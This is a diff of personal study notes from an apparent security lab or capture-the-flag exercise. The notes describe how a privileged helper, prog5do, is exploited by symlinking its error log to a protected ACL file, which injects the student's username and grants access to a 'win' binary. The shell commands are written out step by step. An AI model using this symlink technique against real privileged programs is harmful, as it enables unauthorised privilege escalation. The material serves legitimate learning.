@@ -190,6 +190,13 @@ like sudo, but for prog5; run a target command with prog5’s privileges
 
 you can;t even cat it 
 ![[Pasted image 20260526141859.png]]
+![[Pasted image 20260527135952.png]]
+
+This is the biggest clue though as hacker22 i have the rw permissions i could not cat it. 
+Then it says user blocked by ACL. 
+
+There is a symlink to it 
+https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/
 
 ## ltrace 
 
@@ -227,8 +234,6 @@ In the context of the C and POSIX `open()` system call, passing `0` as the `flag
 
 ![[Pasted image 20260527134613.png]]
 
-I understand the permission for the acl.txt 
-
 #### error.txt
 
 
@@ -261,3 +266,90 @@ Tried chanding the environment variable
 ![[Pasted image 20260526160647.png]]
 
 ![[Pasted image 20260526160735.png]]
+
+### Exploit flow 
+
+#### Step 1: Delete the file 
+![[Pasted image 20260527142304.png]]
+
+#### Step 2: Create symlink
+
+```bash 
+
+ln -s /usr/local/share/acls/22-PzWs2RGx3wRiLImVqtQNUQ-22/acl.txt ~/prog5do-error.txt
+
+```
+
+####  Step 3: Run prog5do with a command
+
+```
+prog5do "hacker22 x"
+```
+
+
+Inside prog5do's execution:
+
+1. Reads the ACL file: `acl.txt` contains `# allowlist`, `bob kaan root grader`
+2. Tokenizes and searches: `strcmp("hacker22", "bob")`, `strcmp("hacker22", "kaan")`, ... all fail
+3. Access denied — writes error log
+4. Opens `~/prog5do-error.txt` with `open(..., O_CREAT|O_WRONLY, 0644)`
+5. **The kernel follows the symlink** → actually opens `/usr/local/share/acls/.../acl.txt`
+6. Writes the message: `hacker22 x: Permission denied. User blocked by ACL.`
+7. Closes the file
+
+#### **Step 4: Verify it worked**
+
+bash
+
+```bash
+cat /usr/local/share/acls/22-PzWs2RGx3wRiLImVqtQNUQ-22/acl.txt
+```
+
+Output shows:
+
+```
+hacker22 x: Permission denied. User blocked by ACL.
+```
+
+Your name is there as the first whitespace-delimited token!
+
+#### Step 5: Run prog5do with the real command**
+
+bash
+
+```bash
+prog5do win
+```
+
+Now when prog5do reads acl.txt:
+
+1. Tokenizes: `strtok(..., " \n")` → first token is `hacker22`
+2. Searches: `strcmp("hacker22", "hacker22")` → **match!**
+3. Access granted — executes `/usr/local/bin/win` with group prog5 privileges
+4. Prints token
+
+![[Pasted image 20260527142952.png]]
+
+22-N4VttUWMDpOdxcZ_toY_cQ-22
+# moon 
+
+## Understanding the code 
+
+![[Pasted image 20260527143933.png]]
+
+## ltrace
+
+![[Pasted image 20260527144101.png]]
+![[Pasted image 20260527144118.png]]
+![[Pasted image 20260527144143.png]]
+
+
+## understanding moon file 
+
+![[Pasted image 20260527144427.png]]
+
+![[Pasted image 20260527144551.png]]
+
+the db-path is gibberish 
+![[Pasted image 20260527144611.png]]
+
